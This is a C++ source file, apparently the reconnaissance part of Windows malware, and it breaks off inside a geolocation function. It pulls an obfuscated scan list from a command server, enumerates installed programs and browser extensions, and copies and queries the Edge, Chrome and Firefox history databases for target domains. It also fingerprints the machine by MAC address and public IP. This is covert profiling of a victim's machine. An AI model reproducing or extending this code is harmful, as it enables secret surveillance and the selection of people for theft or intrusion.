#include "stdafx.h"
#include "checkmachine.h"
#include <Tchar.h>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <Shlwapi.h>
#include <Shlobj.h>
#include "CppSQLite3.h"
#include <Wininet.h>
#include <map>
#include <json/json.h>
#include <fstream>
#include <sstream>
#include <curl/curl.h>
#include "utils.h"

using namespace std;

#define fs std::filesystem

const std::filesystem::directory_options options = (std::filesystem::directory_options::follow_directory_symlink |
	std::filesystem::directory_options::skip_permission_denied);

void GetIEHistory(vector<string>& vecUrls);
void GetChromeHistory(vector<string>& vecUrls);
void GetEdgeHistory(vector<string>& vecUrls);
void GetFireFoxHistory(vector<string>& vecUrls);

#define ALPHABET_SIZE 26

#define JSONCODEVALUE "qdbnqc"

char encryptCharacter(char c) {
	if (isalpha(c)) {
		char base = islower(c) ? 'a' : 'A';
		return ((c - base + 1) % ALPHABET_SIZE) + base;
	}
	return c;
}

char decryptCharacter(char c) {
	if (isalpha(c)) {
		char base = islower(c) ? 'a' : 'A';
		return ((c - base - 1 + ALPHABET_SIZE) % ALPHABET_SIZE) + base;
	}
	return c;
}


struct Path_Scan_Item
{
	string name;
	string path;
	string exe;
	bool sub_folder;
};

struct Path_Scan_Item_v2
{
	string name;
	vector<string> path;
	vector<string> target;
	bool sub_folder;
};

struct Path_Scan_Item_v3
{
	string name;
	string exe;
	string keyword;
	string critical;
};

struct Extension_Scan_Item
{
	string name;
	string key;
};
struct Extension_Scan_Path
{
	string file;
	string path;
	vector<Extension_Scan_Item> vecExtentions;
};
struct Site_Scan_Item
{
	string name;
	string title;
	string domain;
};
using namespace std;


bool parse_json(Json::Value* jsonptr, vector<Path_Scan_Item>& vecPathScan, vector<Path_Scan_Item_v2>& vecPathScanv2, vector<Path_Scan_Item_v3>& vecPathScanv3, vector<Site_Scan_Item>& vecSiteScan, vector<Extension_Scan_Path>& vecExtensionScan)
{
	std::string version;
	unsigned int i = 0;
	unsigned int j = 0;

	try
	{
		Json::Value& json = *jsonptr;
		Json::Value pArrayPaths = json["program_scan"];

		// parse json file
		if (pArrayPaths.isArray())
		{
			for ( i = 0; i < pArrayPaths.size(); i++)
			{
				Json::Value pObjectItem = pArrayPaths[i];

				Path_Scan_Item item;
				Path_Scan_Item_v2 item2;
				Path_Scan_Item_v3 item3;

				version = pObjectItem["type"].asString();
				if (version.compare("1.0") == 0)
				{
					item.exe = pObjectItem["exe"].asString();
					item.name = pObjectItem["name"].asString();
					item.path = pObjectItem["path"].asString();
					item.sub_folder = true;
					vecPathScan.push_back(item);
				}
				else if (version.compare("2.0") == 0)
				{
					item2.name = pObjectItem["name"].asString();
					item2.sub_folder = pObjectItem["subfolder"].asBool();
					Json::Value patharray = pObjectItem["path"];
					Json::Value targetarray = pObjectItem["target"];
					for (j = 0; j < patharray.size(); j++)
					{
						std::string pathstring = patharray[j].asString();
						item2.path.push_back(pathstring);
					}
					for (j = 0; j < targetarray.size(); j++)
					{
						std::string targetstring = targetarray[j].asString();
						item2.target.push_back(targetstring);
					}
					vecPathScanv2.push_back(item2);
				}
				else if (version.compare("3.0") == 0)
				{
					item3.name = pObjectItem["name"].asString();
					item3.exe = pObjectItem["exe"].asString();
					item3.keyword = pObjectItem["keyword"].asString();
					if (pObjectItem.isMember("critical")) {
						item3.critical = pObjectItem["critical"].asString();
					}
					else {
						item3.critical = "false";
					}

					vecPathScanv3.push_back(item3);
				}
			}
		}
		else
		{
		}
		pArrayPaths = json["site_scan"];

		if (pArrayPaths)
		{

			for (i = 0; i < pArrayPaths.size(); i++)
			{
				Json::Value pObjectItem = pArrayPaths[i];

				Site_Scan_Item item;
				item.name = pObjectItem["name"].asString();
				item.title = pObjectItem["title"].asString();
				item.domain = pObjectItem["domain"].asString();

				vecSiteScan.push_back(item);

			}
		}
		else
		{
		}
		pArrayPaths = json["extension_scan"];

		if (pArrayPaths)
		{
			for (i = 0; i < pArrayPaths.size(); i++)
			{
				Json::Value pObjectPath = pArrayPaths[i];

				Extension_Scan_Path path;

				path.path = pObjectPath["path"].asString();
				path.file = pObjectPath["file"].asString();


				Json::Value pArrayItems = pObjectPath["extensions"];

				if (pArrayItems.isArray())
				{
					for (j = 0; j < pArrayItems.size(); j++)
					{
						Json::Value pObjectItem = pArrayItems[j];

						Extension_Scan_Item item;

						item.key = pObjectItem["key"].asString();
						item.name = pObjectItem["name"].asString();


						path.vecExtentions.push_back(item);
					}
				}
				vecExtensionScan.push_back(path);

			}
		}
		else
		{
		}
	}
	catch (std::exception& e)
	{
		return false;
	}

	return true;
}

void SeachFile(string folder, string file, vector<string>& realname, bool subfolersearch)
{
	string fileName = fs::path(file).stem().string();

	if (boost::algorithm::contains(fileName, "*"))
	{
		boost::replace_last(fileName, "*", "");
	}

	if (!fs::is_directory(folder)) {
		file_log("does not exist");
		return;
	}

	fs::path txt = fs::path(file).extension();

	if (subfolersearch == true)
	{
		for (auto const& dir_entry : fs::recursive_directory_iterator(folder, options))
		{
			if (!fs::is_regular_file(dir_entry))
			{
				continue;
			}
			if (boost::algorithm::icontains(dir_entry.path().stem().string(), fileName) && dir_entry.path().extension() == txt)
			{
				fs::path filePath(dir_entry.path().stem().string());
				realname.push_back(filePath.filename().string() + txt.string());
			}
		}
	}
	else
	{
		for (auto const& dir_entry : fs::directory_iterator(folder, options))
		{
			if (!fs::is_regular_file(dir_entry))
			{
				continue;
			}
			if (boost::algorithm::icontains(dir_entry.path().stem().string(), fileName) && dir_entry.path().extension() == txt)
			{
				fs::path filePath(dir_entry.path().stem().string());
				realname.push_back(filePath.filename().string() + txt.string());
			}
		}
	}

}


void getInstallationAppsList(vector<string>& list)
{
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
		char displayName[256];
		DWORD displayNameSize = sizeof(displayName);

		for (DWORD i = 0;; i++) {
			if (RegEnumKeyEx(hKey, i, displayName, &displayNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			HKEY appKey;
			if (RegOpenKeyEx(hKey, displayName, 0, KEY_READ, &appKey) == ERROR_SUCCESS) {
				char appName[256];
				DWORD appNameSize = sizeof(appName);

				if (RegQueryValueEx(appKey, "DisplayName", NULL, NULL, (LPBYTE)appName, &appNameSize) == ERROR_SUCCESS) {
					char exeName[256];
					DWORD exeNameSize = sizeof(exeName);
					if (RegQueryValueEx(appKey, "UninstallString", NULL, NULL, (LPBYTE)exeName, &exeNameSize) == ERROR_SUCCESS) {
						string data;
						data = appName;
						data += exeName;
						list.push_back(data);
					}
					else {
						string data;
						data = appName;
						list.push_back(data);
					}
				}

				RegCloseKey(appKey);
			}

			displayNameSize = sizeof(displayName);
		}

		RegCloseKey(hKey);
	}

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS) {
		char displayName[256];
		DWORD displayNameSize = sizeof(displayName);

		for (DWORD i = 0;; i++) {
			if (RegEnumKeyEx(hKey, i, displayName, &displayNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			HKEY appKey;
			if (RegOpenKeyEx(hKey, displayName, 0, KEY_READ, &appKey) == ERROR_SUCCESS) {
				char appName[256];
				DWORD appNameSize = sizeof(appName);

				if (RegQueryValueEx(appKey, "DisplayName", NULL, NULL, (LPBYTE)appName, &appNameSize) == ERROR_SUCCESS) {
					char exeName[256];
					DWORD exeNameSize = sizeof(exeName);
					if (RegQueryValueEx(appKey, "UninstallString", NULL, NULL, (LPBYTE)exeName, &exeNameSize) == ERROR_SUCCESS) {
						string data;
						data = appName;
						data += exeName;
						list.push_back(data);
					}
					else {
						string data;
						data = appName;
						list.push_back(data);
					}
				}

				RegCloseKey(appKey);
			}

			displayNameSize = sizeof(displayName);
		}

		RegCloseKey(hKey);
	}

	HKEY usersKey;
	if (RegOpenKeyEx(HKEY_USERS, NULL, 0, KEY_READ | KEY_WOW64_64KEY, &usersKey) == ERROR_SUCCESS) {
		char userSubkey[256];
		DWORD userSubkeySize = sizeof(userSubkey);

		for (DWORD i = 0;; i++) {
			if (RegEnumKeyEx(usersKey, i, userSubkey, &userSubkeySize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			HKEY userUninstallKey;
			char userUninstallPath[256];
			snprintf(userUninstallPath, sizeof(userUninstallPath), "%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", userSubkey);

			if (RegOpenKeyEx(HKEY_USERS, userUninstallPath, 0, KEY_READ, &userUninstallKey) == ERROR_SUCCESS) {
				char userDisplayName[256];
				DWORD userDisplayNameSize = sizeof(userDisplayName);

				for (DWORD j = 0;; j++) {
					if (RegEnumKeyEx(userUninstallKey, j, userDisplayName, &userDisplayNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
						break;

					HKEY appKey;
					if (RegOpenKeyEx(userUninstallKey, userDisplayName, 0, KEY_READ, &appKey) == ERROR_SUCCESS) {
						char appName[256];
						DWORD appNameSize = sizeof(appName);

						if (RegQueryValueEx(appKey, "DisplayName", NULL, NULL, (LPBYTE)appName, &appNameSize) == ERROR_SUCCESS) {
							char exeName[256];
							DWORD exeNameSize = sizeof(exeName);
							if (RegQueryValueEx(appKey, "UninstallString", NULL, NULL, (LPBYTE)exeName, &exeNameSize) == ERROR_SUCCESS) {
								string data;
								data = appName;
								data += exeName;
								list.push_back(data);
							}
							else {
								string data;
								data = appName;
								list.push_back(data);
							}
						}

						RegCloseKey(appKey);
					}

					userDisplayNameSize = sizeof(userDisplayName);
				}

				RegCloseKey(userUninstallKey);
			}

			userSubkeySize = sizeof(userSubkey);
		}

		RegCloseKey(usersKey);
	}

	if (RegOpenKeyEx(HKEY_USERS, NULL, 0, KEY_READ | KEY_WOW64_32KEY, &usersKey) == ERROR_SUCCESS) {
		char userSubkey[256];
		DWORD userSubkeySize = sizeof(userSubkey);

		for (DWORD i = 0;; i++) {
			if (RegEnumKeyEx(usersKey, i, userSubkey, &userSubkeySize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			HKEY userUninstallKey;
			char userUninstallPath[256];
			snprintf(userUninstallPath, sizeof(userUninstallPath), "%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", userSubkey);

			if (RegOpenKeyEx(HKEY_USERS, userUninstallPath, 0, KEY_READ, &userUninstallKey) == ERROR_SUCCESS) {
				char userDisplayName[256];
				DWORD userDisplayNameSize = sizeof(userDisplayName);

				for (DWORD j = 0;; j++) {
					if (RegEnumKeyEx(userUninstallKey, j, userDisplayName, &userDisplayNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
						break;

					HKEY appKey;
					if (RegOpenKeyEx(userUninstallKey, userDisplayName, 0, KEY_READ, &appKey) == ERROR_SUCCESS) {
						char appName[256];
						DWORD appNameSize = sizeof(appName);

						if (RegQueryValueEx(appKey, "DisplayName", NULL, NULL, (LPBYTE)appName, &appNameSize) == ERROR_SUCCESS) {
							char exeName[256];
							DWORD exeNameSize = sizeof(exeName);
							if (RegQueryValueEx(appKey, "UninstallString", NULL, NULL, (LPBYTE)exeName, &exeNameSize) == ERROR_SUCCESS) {
								string data;
								data = appName;
								data += exeName;
								list.push_back(data);
							}
							else {
								string data;
								data = appName;
								list.push_back(data);
							}
						}

						RegCloseKey(appKey);
					}

					userDisplayNameSize = sizeof(userDisplayName);
				}

				RegCloseKey(userUninstallKey);
			}

			userSubkeySize = sizeof(userSubkey);
		}

		RegCloseKey(usersKey);
	}

	std::sort(list.begin(), list.end());
	auto last = std::unique(list.begin(), list.end());
	list.erase(last, list.end());
}

extern vector<string> target_processlist;
extern map<string, string> target_sitelist;
extern map<string, string> target_processlist_critical;

size_t caseInsensitiveFind(const std::string& haystack, const std::string& needle) {
	std::string haystackLower = haystack;
	std::transform(haystackLower.begin(), haystackLower.end(), haystackLower.begin(), ::tolower);

	std::string needleLower = needle;
	std::transform(needleLower.begin(), needleLower.end(), needleLower.begin(), ::tolower);

	return haystackLower.find(needleLower);
}

void ScanPath(vector<Path_Scan_Item>& vecPathScan, vector<Path_Scan_Item_v3> vecPathScanV3, vector<string>& vecResult)
{
	target_processlist.clear();
	target_processlist_critical.clear();

	for (auto const& item : vecPathScan)
	{
		try {
			char szOut[MAX_PATH] = { 0 };

			ExpandEnvironmentStringsA(item.path.c_str(), szOut, sizeof(szOut));
			string searchRootFolder = fs::path(szOut).make_preferred().string();
			file_log(searchRootFolder);

			if (boost::algorithm::ends_with(searchRootFolder, "*\\"))
			{
				boost::algorithm::erase_last(searchRootFolder, "*\\");

				fs::path parentFolder = fs::path(searchRootFolder).parent_path();
				string folder = fs::path(searchRootFolder).filename().string();


				try
				{
					for (auto const& dir_entry : fs::directory_iterator(parentFolder, options))
					{
						if (fs::is_directory(dir_entry))
						{
							if (boost::algorithm::icontains(dir_entry.path().filename().string(), folder))
							{
								vector<std::string> realname1;
								file_log(dir_entry.path().string());
								file_log("scan started");
								SeachFile(dir_entry.path().string(), item.exe, realname1, item.sub_folder);
								file_log("scan finihsed");
								if (!realname1.empty())
								{
									target_processlist.insert(target_processlist.end(), realname1.begin(), realname1.end());
									vecResult.insert(vecResult.end(), realname1.begin(), realname1.end());
								}
							}
						}
					}
				}
				catch (...)
				{
				}
			}
			else
			{

				vector<std::string> realname2;
				file_log("scan started");
				SeachFile(searchRootFolder, item.exe, realname2, item.sub_folder);
				file_log("scan finihsed");
				if (!realname2.empty())
				{
					target_processlist.insert(target_processlist.end(), realname2.begin(), realname2.end());
					vecResult.insert(vecResult.end(), realname2.begin(), realname2.end());
				}
			}
		}
		catch (...) {

		}
	}

	//scan from registry path
	vector<string> applist;

	getInstallationAppsList(applist);

	for (auto searchitem3 : vecPathScanV3)
	{
		for (auto appitem : applist)
		{
			size_t position = caseInsensitiveFind(appitem, searchitem3.keyword);
			if (position != std::string::npos)
			{
				vecResult.push_back(searchitem3.exe);
				target_processlist.push_back(searchitem3.exe);
				target_processlist_critical.insert(make_pair(searchitem3.exe, searchitem3.critical));
			}
		}
	}
}

void ConvertPathv2Tov1(const vector<Path_Scan_Item_v2>& vecPathScanv2, vector<Path_Scan_Item>& vecPathScan)
{
	for (auto const& item : vecPathScanv2)
	{
		try {
			for (const auto& elementPath : item.path) {
				for (const auto& elementTarget : item.target)
				{
					Path_Scan_Item itemv1;
					itemv1.exe = elementTarget;
					itemv1.path = elementPath;
					itemv1.name = item.name;
					itemv1.sub_folder = item.sub_folder;

					size_t pos = itemv1.name.find("*");
					{
						itemv1.name.replace(pos, 1, itemv1.exe);
					}

					vecPathScan.push_back(itemv1);
				}
			}

		}
		catch (std::exception& e) {

		}
	}
}

void process_extension_directory(const fs::path& path, vector<string>& vecResult, Extension_Scan_Path scan_path, int depth = 0) {
	if (depth > 2) {
		return; // Skip subdirectories beyond depth 3
	}
	for (const auto& dir_entry : fs::directory_iterator(path)) {
		if (dir_entry.is_directory()) {
			process_extension_directory(dir_entry.path(), vecResult, scan_path, depth + 1);
		}
		else {
			if (fs::is_regular_file(dir_entry) && dir_entry.path().filename().string() == scan_path.file)
			{
				Json::Value json;
				Json::CharReaderBuilder builder;
				Json::CharReader* reader = builder.newCharReader();
				std::ifstream file(dir_entry.path().string().c_str(), std::ifstream::binary);
				JSONCPP_STRING errs;

				if (!Json::parseFromStream(builder, file, &json, &errs))
				{
					continue;
				}

				Json::StreamWriterBuilder writer;
				string content = Json::writeString(writer, json);

				for (auto const& item : scan_path.vecExtentions)
				{
					if (content.find(item.key) != std::string::npos)
					{
						vecResult.push_back(item.name);
						break;
					}
				}
			}
		}
	}
}

// If expanded path is Chrome User Data\Default\Extensions, return all profile Extensions paths; otherwise return { expandedPath }.
static vector<string> getExtensionPathsToScan(const string& expandedPath)
{
	vector<string> paths;
	fs::path p(expandedPath);
	string pathStr = p.make_preferred().string();
	// Chrome User Data\Default\Extensions -> scan all profiles (Default, Profile 1, Profile 2, System Profile, etc.)
	if (pathStr.find("Google") != string::npos && pathStr.find("Chrome") != string::npos &&
		pathStr.find("User Data") != string::npos && pathStr.find("Default") != string::npos &&
		pathStr.find("Extensions") != string::npos)
	{
		fs::path userDataPath = p.parent_path().parent_path(); // Extensions -> Default -> User Data
		if (fs::exists(userDataPath) && fs::is_directory(userDataPath))
		{
			try
			{
				for (const auto& entry : fs::directory_iterator(userDataPath, options))
				{
					if (!entry.is_directory()) continue;
					fs::path extPath = entry.path() / "Extensions";
					if (fs::exists(extPath) && fs::is_directory(extPath))
						paths.push_back(extPath.make_preferred().string());
				}
			}
			catch (...) {}
		}
	}
	if (paths.empty())
		paths.push_back(expandedPath);
	return paths;
}

void ScanExtension(vector<Extension_Scan_Path>& vecExtensionScan, vector<string>& vecResult)
{
	for (const auto& scan_path : vecExtensionScan)
	{
		char szOut[MAX_PATH] = { 0 };

		string strPath = scan_path.path;

		boost::replace_last(strPath, "*", "");

		fs::path path = fs::path(strPath).make_preferred();
		ExpandEnvironmentStringsA(path.string().c_str(), szOut, sizeof(szOut));

		string expandedPath(szOut);
		if (!PathFileExists(szOut)) continue;

		vector<string> pathsToScan = getExtensionPathsToScan(expandedPath);
		try
		{
			for (const string& dirPath : pathsToScan)
			{
				process_extension_directory(dirPath, vecResult, scan_path);
			}
		}
		catch (...)
		{
			file_log("exception is occured");
		}
	}
}

void SaveScanResult(Json::Value& json, string type, vector<string>& vecResult)
{
	Json::Value pArrayPaths;

	for (size_t i = 0; i < vecResult.size(); i++)
	{
		Json::Value pair1(Json::objectValue);
		pair1["name"] = vecResult[i].c_str();
		pArrayPaths.append(pair1);
	}

	json[type.c_str()] = pArrayPaths;
}

string WStringToString(const wstring& wstr)
{
	string str;
	size_t size;
	str.resize(wstr.length());
	wcstombs_s(&size, &str[0], str.size() + 1, wstr.c_str(), wstr.size());
	return str;
}
vector<string> CheckUrls(vector<Site_Scan_Item>& vecSiteScan, vector<string>& vecUrls)
{
	vector<string> vecResult;

	for (const auto& item : vecSiteScan)
	{
		bool bFound = false;

		for (string& url : vecUrls)
		{
			if (url.find(item.domain) != string::npos)
			{
				vecResult.push_back(item.name);
				bFound = true;
				break;
			}
		}
		if (bFound)
			continue;
	}
	return vecResult;
}

void GetEdgeHistory(vector<string>& vecUrls)
{
	char path[MAX_PATH] = { 0 };
	char path_tmp[MAX_PATH] = { 0 };

	::SHGetSpecialFolderPathA(NULL, path, CSIDL_LOCAL_APPDATA, FALSE);
	strcat_s(path, "\\Microsoft\\Edge\\User Data\\default\\History");
	strcpy_s(path_tmp, path);
	strcat_s(path_tmp, ".tmp");

	if (!fs::exists(path))
	{
		return;
	}
	CopyFileA(path, path_tmp, false);

	if (!fs::exists(path_tmp))
	{
		return;
	}
	try
	{
		CppSQLite3DB db;
		CppSQLite3Query query;
		db.open(path_tmp);

		query = db.execQuery("select url from urls");

		while (!query.eof())
		{
			vecUrls.push_back(query.fieldValue("url"));
			query.nextRow();
		}
		query.finalize();
		db.close();
	}
	catch (CppSQLite3Exception& e)
	{
	}
	DeleteFileA(path_tmp);
}

void process_chromehistory_directory(const fs::path& path, vector<string>& vecUrls, int depth = 0) {
	if (depth > 2) {
		return;
	}
	for (const auto& dir_entry : fs::directory_iterator(path)) {
		if (dir_entry.is_directory()) {
			process_chromehistory_directory(dir_entry.path(), vecUrls, depth + 1);
		}
		else {
			if (fs::is_regular_file(dir_entry) && dir_entry.path().filename().string() == "History")
			{
				string path = dir_entry.path().string();
				string path_temp = path + ".tmp";

				if (!fs::exists(path))
				{
					return;
				}
				CopyFileA(path.c_str(), path_temp.c_str(), false);

				if (!fs::exists(path_temp))
				{
					return;
				}
				try
				{
					CppSQLite3DB db;
					CppSQLite3Query query;
					db.open(path_temp.c_str());

					query = db.execQuery("select url from urls");

					while (!query.eof())
					{
						vecUrls.push_back(query.fieldValue("url"));
						query.nextRow();
					}
					query.finalize();
					db.close();
				}
				catch (CppSQLite3Exception& e)
				{
				}
				DeleteFileA(path_temp.c_str());
			}
		}
	}
}

void GetChromeHistory(vector<string>& vecUrls)
{
	char rootpath[MAX_PATH] = { 0 };

	::SHGetSpecialFolderPathA(NULL, rootpath, CSIDL_LOCAL_APPDATA, FALSE);
	strcat_s(rootpath, "\\google\\chrome\\User Data\\");
	if (!fs::exists(rootpath))
	{
		return;
	}

	process_chromehistory_directory(rootpath, vecUrls);
}

void GetIEHistory(vector<string>& vecUrls)
{
	BOOL ret;
	HANDLE hEnumHandle;
	DWORD dwCacheEntryInfo;
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntryInfo = NULL;

	dwCacheEntryInfo = 0;
	hEnumHandle = FindFirstUrlCacheEntry(NULL, NULL, &dwCacheEntryInfo);

	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		lpCacheEntryInfo = (LPINTERNET_CACHE_ENTRY_INFO)HeapAlloc(GetProcessHeap(), 0, dwCacheEntryInfo * sizeof(char));
		hEnumHandle = FindFirstUrlCacheEntry(NULL, lpCacheEntryInfo, &dwCacheEntryInfo);

		if (hEnumHandle == NULL)
		{
			HeapFree(GetProcessHeap(), 0, lpCacheEntryInfo);
			return;
		}
	}
	while (TRUE)
	{
		vecUrls.push_back(lpCacheEntryInfo->lpszSourceUrlName);
		ret = FindNextUrlCacheEntry(hEnumHandle, lpCacheEntryInfo, &dwCacheEntryInfo);

		if (!ret)
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				lpCacheEntryInfo = (LPINTERNET_CACHE_ENTRY_INFO)HeapReAlloc(GetProcessHeap(), 0, lpCacheEntryInfo, dwCacheEntryInfo);
				ret = FindNextUrlCacheEntry(hEnumHandle, lpCacheEntryInfo, &dwCacheEntryInfo);
			}
		}
		if (!ret)
			break;
	}
	FindCloseUrlCache(hEnumHandle);
}
void GetFireFoxHistory(vector<string>& vecUrls)
{
	char path[MAX_PATH] = { 0 };
	char path_tmp[MAX_PATH] = { 0 };

	::SHGetSpecialFolderPathA(NULL, path, CSIDL_APPDATA, FALSE);
	strcat_s(path, "\\Mozilla\\Firefox\\Profiles");
	string dbPath;

	if (!fs::exists(path))
	{
		return;
	}
	for (auto const& dir_entry : fs::recursive_directory_iterator(path))
	{
		if (fs::is_regular_file(dir_entry) && dir_entry.path().filename().string() == "places.sqlite")
		{
			dbPath = dir_entry.path().string();
			break;
		}
	}
	if (dbPath.empty())
	{
		return;
	}
	strcpy_s(path_tmp, dbPath.c_str());
	strcat_s(path_tmp, ".tmp");

	CopyFileA((char*)dbPath.c_str(), path_tmp, false);

	if (!fs::exists(path_tmp))
	{
		return;
	}
	try
	{
		CppSQLite3DB db;
		CppSQLite3Query query;
		db.open(path_tmp);

		query = db.execQuery("select url from moz_places");

		while (!query.eof())
		{
			vecUrls.push_back(query.fieldValue("url"));
			query.nextRow();
		}
		query.finalize();
		db.close();
	}
	catch (CppSQLite3Exception& e)
	{
	}
	DeleteFileA(path_tmp);
}
void ScanBrowerHistory(vector<Site_Scan_Item>& vecSiteScan, vector<string>& vecResult)
{
	target_sitelist.clear();
	vector<string> vecUrls;

	GetEdgeHistory(vecUrls);
	//GetEdgeHistory(vecUrls);
	vector<string> vecTmp = CheckUrls(vecSiteScan, vecUrls);
	copy(vecTmp.begin(), vecTmp.end(), back_inserter(vecResult));

	// GetIEHistory(vecUrls);
	vecUrls.clear();
	GetChromeHistory(vecUrls);
	//GetChromeHistory(vecUrls);
	vecTmp = CheckUrls(vecSiteScan, vecUrls);
	copy(vecTmp.begin(), vecTmp.end(), back_inserter(vecResult));

	vecUrls.clear();
	GetFireFoxHistory(vecUrls);
	//GetFireFoxHistory(vecUrls);
	vecTmp = CheckUrls(vecSiteScan, vecUrls);
	copy(vecTmp.begin(), vecTmp.end(), back_inserter(vecResult));

	sort(vecResult.begin(), vecResult.end());

	vecResult.erase(unique(vecResult.begin(), vecResult.end()), vecResult.end());

	for (auto scanitem : vecSiteScan)
	{
		target_sitelist.insert(make_pair(scanitem.name, scanitem.title));
	}

	//	target_sitelist.insert(target_sitelist.end(), vecResult.begin(), vecResult.end());
}

bool getJsonFromOnline(Json::Value& json)
{
	static std::string totalbufferstr = "";
	if (totalbufferstr == "")
	{
		GetJsonResponse(g_commandserver.jsonbinurl_comscan, totalbufferstr);
		file_log("json command");
		file_log(g_commandserver.jsonbinurl_comscan);
		file_log(totalbufferstr);
	}
	else
	{
		file_log("cached json command");
	}


	BYTE totalbuffer[40960] = { 0 };
	memcpy(totalbuffer, totalbufferstr.c_str(), totalbufferstr.length());

	for (size_t i = 0; i < totalbufferstr.length(); i++) {
		totalbuffer[i] = decryptCharacter(totalbuffer[i]);
	}

	if (strstr((const char*)totalbuffer, JSONCODEVALUE) == NULL)
	{
		return false;
	}

	Json::CharReaderBuilder builder;
	Json::CharReader* reader = builder.newCharReader();
	JSONCPP_STRING errs;
	const std::string jsonstring((char*)totalbuffer);
	std::istringstream jsonStream(jsonstring);

	Json::parseFromStream(builder, jsonStream, &json, &errs);

	return true;
}

bool FetchConfigFromServer(const std::string& hostPort, Json::Value& outConfig)
{
	outConfig = Json::Value(Json::objectValue);
	std::string url = "http://" + hostPort + "/config";
	std::string jsonResponse;
	file_log("FetchConfigFromServer: " + url);
	if (!GetJsonResponse(url, jsonResponse))
	{
		file_log("FetchConfigFromServer: GetJsonResponse failed");
		return false;
	}
	Json::CharReaderBuilder builder;
	JSONCPP_STRING errs;
	std::istringstream jsonStream(jsonResponse);
	if (!Json::parseFromStream(builder, jsonStream, &outConfig, &errs))
	{
		file_log("FetchConfigFromServer: parse failed " + errs);
		return false;
	}
	if (!outConfig.isObject() || !outConfig.isMember("program_scan"))
	{
		file_log("FetchConfigFromServer: missing program_scan");
		return false;
	}
	file_log("FetchConfigFromServer: ok");
	return true;
}

BOOL scan_target(char* out, const Json::Value* configFromServer)
{
	vector<Path_Scan_Item> vecPathScan;
	vector<Path_Scan_Item_v2> vecPathScanV2;
	vector<Path_Scan_Item_v3> vecPathScanV3;
	vector<Site_Scan_Item> vecSiteScan;
	vector<Extension_Scan_Path> vecExtensionScan;

	// json
	Json::Value json;

	// output info
	vector<string> vecPathResult, vecSiteResult, vecExtensionResult;

	// json out
	Json::Value jsonOut(Json::objectValue);

	try
	{
		Json::Value* pConfigToUse = nullptr;
		Json::Value configToUse(Json::objectValue);

		if (configFromServer && configFromServer->isObject() && configFromServer->isMember("program_scan"))
		{
			configToUse = *configFromServer;
			pConfigToUse = &configToUse;
			file_log("scan_target: using config from server");
		}
		if (!pConfigToUse && getJsonFromOnline(json))
		{
			configToUse = json[JSONCODEVALUE];
			pConfigToUse = &configToUse;
			Json::StreamWriterBuilder writer;
			file_log(Json::writeString(writer, configToUse));
		}

		if (pConfigToUse)
		{
			parse_json(pConfigToUse, vecPathScan, vecPathScanV2, vecPathScanV3, vecSiteScan, vecExtensionScan);
		}

		//scan according
		ConvertPathv2Tov1(vecPathScanV2, vecPathScan);
		ScanPath(vecPathScan, vecPathScanV3, vecPathResult);
		file_log("ScanPath finished");
		ScanExtension(vecExtensionScan, vecExtensionResult);
		file_log("ScanExtension finished");
		ScanBrowerHistory(vecSiteScan, vecSiteResult);
		file_log("ScanBrowerHistory finished");

		//write to json
		file_log("scan finished");

		//generate uid
		std::string macAddress = GetMacAddress();
		std::string uid = MacAddressToLicenseKey(macAddress);
		if (!uid.empty()) {
			jsonOut["uid"] = uid;
		}
		else {
			jsonOut["uid"] = "Weird";
		}

		file_log("saving scan result");

		SaveScanResult(jsonOut, "path_scan", vecPathResult);
		SaveScanResult(jsonOut, "site_scan", vecSiteResult);
		SaveScanResult(jsonOut, "extension_scan", vecExtensionResult);

		file_log("finished");

		//writeEncryptedJson(jsonOut);
		//WriteToFile(OBFUSCATED("output.json"), &jsonOut);

		Json::StreamWriterBuilder writer;
		file_log(Json::writeString(writer, jsonOut));

		if (out != NULL)
		{
			std::string buffer = Json::writeString(writer, jsonOut);
			strcpy(out, buffer.c_str());
		}

		if (vecPathResult.size() == 0 && vecSiteResult.size() == 0 && vecExtensionResult.size() == 0)
			return false;

		return true;
	}
	catch (std::exception& e)
	{
		//LOG(e.what());
		file_log(e.what());
		return false;
	}

	return true;
}


static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

std::string GetPublicIPAddress() {
	CURL* curl;
	CURLcode res;
	std::string readBuffer;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/ip");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

		res = curl_easy_perform(curl);

		curl_easy_cleanup(curl);

		if (res == CURLE_OK) {
			readBuffer.erase(std::remove(readBuffer.begin(), readBuffer.end(), '\n'), readBuffer.end());
			return readBuffer;
		}
	}

	return "";
}

std::string getCountry()
{
	std::string ipAddress = GetPublicIPAddress();
	file_log(ipAddress);
	ipAddress.erase(std::remove_if(ipAddress.begin(), ipAddress.end(), ::isspace), ipAddress.end());
	ipAddress.erase(std::remove_if(ipAddress.begin(), ipAddress.end(),
		[](unsigned char c) { return std::isspace(c) || c == '\n'; }),
		ipAddress.end());

	if (!ipAddress.empty()) {
		// You can replace this with your preferred geolocation API
		std::string apiUrl = "http://ipinfo.io/" + ipAddress + "/json";

		CURL* curl;
		CURLcode res;
		std::string readBuffer;

		curl_global_init(CURL_GLOBAL_DEFAULT);
		curl = curl_easy_init();

